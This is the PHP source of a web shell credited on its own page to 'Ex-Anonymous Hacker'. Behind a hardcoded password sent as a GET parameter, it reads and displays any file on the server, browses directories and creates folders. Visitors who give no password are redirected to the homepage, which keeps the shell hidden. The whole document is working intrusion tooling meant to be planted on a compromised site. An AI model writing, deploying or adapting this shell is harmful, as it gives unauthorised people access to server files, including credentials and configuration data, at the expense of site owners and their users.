<?php
error_reporting(0);
	date_default_timezone_set("Asia/Kolkata");

	class MainClass {
		protected $TheLoginPassword = "Secretpassword";
		public function returnPassword() {
			return $this->TheLoginPassword;
		}

		public function listDirectories($path) {

			$Status = '';

			if(is_dir($path)) {
				
				$listOfFiles = scandir($path);
				foreach ($listOfFiles as $file) {
					$ftype = (filetype($file) === "dir" ? "FOLDER" : "FILE");
					$fsize = filesize($file);
					$fctime = filectime($file);
					$file_name = '';
					if(strlen($file) > 20) {
						$file_name = substr($file, 0, 20). "..";
					} else {
						$file_name = $file;
					}

					echo "
						<div id='file'>
							<div id='file_type'>
								$ftype
							</div>
							<a href='$file' title='$file'>$file_name</a><br/>
							<div id='file_size'>
								$fsize BYTES
							</div>
						</div>
					";
				}

			} else {
				
			}
		}

		public function showNavbar() {

			$server_name = strtoupper($_SERVER[ 'SERVER_NAME' ]);
			$time = date("d/m/y h:i:s A", time());

			return "
<!DOCTYPE html>
<html lang='en'>
	<head>
	<meta name='author' content='Ex-Anonymous Hacker'>
		<style>
			* {
				margin:0;
				padding:0;
				box-sizing:border-box;
				font-family:monospace;
				background-color: #000;
			}
			.navbar {
				padding:30px;
				color:white;
			}

			#credit_txt {
				font-size:18px;
				font-weight:bold;
			}

			#server_name {
				text-align:center;
				font-size:20px;
			}

			#file {
				margin:0rem 2rem auto;
				display:flex;
				color:white;
				justify-content:space-between;
				max-width:400px;
				align-items:left;
				text-align:left;
			}

			#file a{
				color:white;
				-webkit-transition:.2s ease-in;
			}

			h3 {
				color:white;
				margin-left:2rem;
				margin-bottom:2rem;
			}

			textarea {
				color:white;
				border-radius:5px;
				margin-left:2rem;
				margin-bottom:2rem;
			}

		</style>
	</head>
	<body>
		<section class='navbar'>
			<div id='credit_txt'>
				Shell By Ex-Anonymous Hacker
			</div>
			<div id='server_name'>
				You are accessing $server_name at $time
			</div>
		</section>
			";

		}

	}

	$newObj = new MainClass();

	if(isset($_SERVER) and $_SERVER[ 'REQUEST_METHOD' ] === "GET") {

		if(isset($_GET[ 'UserEnteredPassword' ]) && !empty($_GET[ 'UserEnteredPassword' ])) {

			$UserPassword = trim($_GET[ 'UserEnteredPassword' ]);
			if($UserPassword === $newObj->returnPassword()) {
				
				echo $newObj->showNavbar();

				if(isset($_GET[ 'File' ])) {
					$file = trim($_GET[ 'File' ]);
					if(file_exists($file)) {
						$fileToReadHandler = fopen($file, "r");
						$content = fread($fileToReadHandler, 999999);
						$content = (strpos($content, '"') ? str_replace('"', "'", $content) : $content);
						fclose($fileToReadHandler);
						Echo "
						<h3>File Contents: </h3>
<textarea rows=20 cols=100>
	$content
</textarea>
						";
					} else {
						Echo "<h3>File Does not Exists!</h3>";
					}
				}

				if(isset($_GET[ 'Folder' ])) {
					mkdir(trim($_GET[ 'Folder' ]));
				}

				if(isset($_GET[ 'Path' ])) {

					if(!is_dir(trim($_GET[ 'Path' ]))) {
						die("<h3>Path is invalid</h3>");
					}

					echo $newObj->listDirectories(trim($_GET[ 'Path' ]));
				} else {
					echo $newObj->listDirectories(".");
				}

			} else {
				die("Wrong Password. You can't access the Web server :(");
			}
			
		} else {
		
			$protocol = ( $_SERVER[ 'SERVER_PROTOCOL' ] === "HTTP/1.1" ? "http://" : "https://" );
			$hostname = $_SERVER[ 'SERVER_NAME' ];
			$fullURL = $protocol.$hostname;
			header("location: ".$fullURL);
		}

	}
?>